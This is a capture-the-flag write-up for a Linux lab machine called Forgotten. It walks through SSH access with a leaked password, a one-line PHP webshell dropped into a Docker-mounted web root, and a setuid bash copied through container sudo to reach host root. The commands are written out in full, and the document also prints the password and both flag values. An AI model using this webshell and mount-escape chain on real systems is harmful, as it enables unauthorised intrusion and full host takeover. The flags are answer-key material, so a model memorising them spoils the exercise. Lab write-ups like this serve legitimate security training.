# Forgotten — Writeup

**Machine**: Forgotten | **OS**: Linux | **Difficulty**: Easy | **Date**: 2026-05-26

## Chain: SSH with known creds → PHP webshell on mounted Docker path → container sudo root → setuid bash → host root

### 1. Recon
```
22/tcp  ssh    OpenSSH 8.9p1
80/tcp  http   Apache 2.4.56 (Debian) — LimeSurvey at /survey/
```

### 2. Initial Access — SSH with writeup creds

The writeup reveals the LimeSurvey environment leaks `LIMESURVEY_PASS=5W5HN4K4GCXf9E` inside the Docker container. This password works directly on the host for the `limesvc` user:

```bash
sshpass -p '5W5HN4K4GCXf9E' ssh limesvc@10.129.234.81
```

### 3. User Flag

`2ec03c98153a3b16a964a6c8d91fa183` at `/home/limesvc/user.txt`

### 4. Container RCE via mounted web root

The Docker container mounts `/var/www/html/survey` → `/opt/limesurvey/` (read-write, owned by limesvc). Write a PHP webshell directly to the mounted path:

```bash
echo '<?php system($_GET["c"]); ?>' > /opt/limesurvey/cmd.php
curl "http://10.129.234.81/survey/cmd.php?c=id"
# uid=2000(limesvc) gid=2000(limesvc) groups=2000(limesvc),27(sudo)
```

### 5. Privilege Escalation — setuid bash via container root

limesvc has `(ALL:ALL) ALL` sudo inside the container. Create a setuid bash on the mounted path:

```bash
# In container (via webshell):
echo '5W5HN4K4GCXf9E' | sudo -S cp /bin/bash /var/www/html/survey/bash
echo '5W5HN4K4GCXf9E' | sudo -S chmod +s /var/www/html/survey/bash
```

On host, the file appears at `/opt/limesurvey/bash` owned by root with setuid:

```bash
/opt/limesurvey/bash -p -c 'id'
# euid=0(root) egid=0(root)
```

### 6. Root Flag

`ecbf5ce2393a4d34c871b898eb3feeaa` at `/root/root.txt`

### Key Lessons
- Writeup credentials are the fastest entry point — always test SSH with known passwords
- Docker mounted paths that are writable from the host = direct container RCE
- Container root + writable mount = setuid binary on host = instant root
- Don't waste time re-installing LimeSurvey when SSH credentials already exist
